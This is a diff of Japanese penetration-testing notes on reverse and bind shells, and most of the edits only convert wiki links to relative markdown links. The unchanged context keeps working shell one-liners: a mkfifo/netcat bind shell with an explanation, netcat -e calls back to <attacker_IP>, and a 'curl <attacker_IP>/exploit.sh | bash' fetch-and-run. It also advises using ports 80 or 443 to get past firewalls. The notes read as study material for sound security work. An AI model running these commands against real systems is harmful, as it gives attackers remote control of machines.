@@ -1,6 +1,6 @@
 - 関連ノート
-	- [[💥Windows Privilege Escalation]]
-	- [[スクリプト・コマンド・シェル操作#コマンドの実行可否を確認する]]
+	- [💥Windows Privilege Escalation](../🪟Windows/💥Windows%20Privilege%20Escalation.md)
+	- [スクリプト・コマンド・シェル操作](スクリプト・コマンド・シェル操作.md#コマンドの実行可否を確認する)
 
 > [!TIP]
 > リスナーに指定するポートは、FWによる遮断を防ぐため、原則80 もしくは 443を使用すること
@@ -82,7 +82,7 @@ $$左が攻撃側、右がターゲット側$$
 > 実践ではほとんど使わない。
 
 1. ターゲットマシン上でリスナーを用意する
-	 ([[#補足：名前付きパイプコマンドの解説]])
+	 ([What is the shell](What%20is%20the%20shell.md#補足：名前付きパイプコマンドの解説))
 ```zsh
 mkfifo /tmp/f; nc -lvnp <Port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
@@ -133,7 +133,7 @@ busybox nc <attacker_IP> <Port> -e sh
 ##### 補足：名前付きパイプコマンドの解説
 
 - `mkfifo /tmp/f`:FIFO (名前付きパイプ) を作成
-	- [[用語#名前付きパイプ]]
+	- [用語](../../Misc/用語.md#名前付きパイプ)
 - `< /tmp/f | /bin/sh >/tmp/f 2>&1`:  攻撃者がリスナーに接続して入力した内容を"/tmp/f"に書き込み、"/bin/sh"は書き込まれた内容を入力としてshellを実行し、実行結果を標準エラー出力（2）と標準出力（1）も含めて/tmp/fに書き込むことで、攻撃者に実行結果を返す
 - `2>&1` は、標準エラー出力（2）を標準出力（1）にリダイレクトすることを意味する。つまり、エラーメッセージが標準出力に統合され、同じパイプ上で送信される。この方法により、エラーメッセージもクライアントに送信される
 
@@ -216,7 +216,7 @@ nc -e cmd.exe <attacker_IP> <Port>
 
 # WebShell
 
-- [[WebShell]]
+- [WebShell](WebShell.md)
 
 ---
 ---
@@ -306,13 +306,13 @@ sudo rlwrap nc -lvnp <Port>
 curl <attacker_IP>/exploit.sh | bash
 ```
 
-5. リバースシェルを確立したら、[[#安定化 w/ Python]]へ進む
+5. リバースシェルを確立したら、[What is the shell](What%20is%20the%20shell.md#安定化%20w/%20Python)へ進む
 
 ---
 
 ## 🪟 Windowsターゲット向け安定化
 
-Windowsでは安定化する手法が限られており、効果的な手法は[[#OS共通：rlwrapを使ってリスナーを立てる]]か、[[#Metasploit - multi/handler]]を使う
+Windowsでは安定化する手法が限られており、効果的な手法は[What is the shell](What%20is%20the%20shell.md#OS共通：rlwrapを使ってリスナーを立てる)か、[What is the shell](What%20is%20the%20shell.md#Metasploit%20-%20multi/handler)を使う
 
 その他、PowerShellのエンコーディングの問題や文字化け解消に使えるテクニック
 ```powershell
@@ -350,7 +350,7 @@ nc -nv <target_IP> <port>
 - ❌文法が難しく、デフォルトでインストールされていない
 - ❌**Windowsではあまり意味がない**（netcatと変わらない）
 - 関連ノート：
-	- [[Port Redirection & SSH Port Forwarding#LinuxツールによるPort Forwading(Socat)]]
+	- [Port Redirection & SSH Port Forwarding](../Stealth&Evasion/Port%20Redirection/Port%20Redirection%20&%20SSH%20Port%20Forwarding.md#LinuxツールによるPort%20Forwading(Socat))
 
 ### Linuxシェルの安定化 w/ Socat
 
@@ -420,7 +420,7 @@ socat TCP:<target_IP>:<Port> -
 [Nishang - GitHub](https://github.com/samratashok/nishang)（apt install対応）
 
 - 目的：Windowsマシンへの侵害後、永続化のため
-	- 他の[[#Base64化したPowerShellリバースシェルワンライナー]]などがうまくいかないときに使う
+	- 他の[What is the shell](What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)などがうまくいかないときに使う
 
 1. 攻撃者のマシンでリバースシェルペイロードスクリプトを用意する
 ```zsh
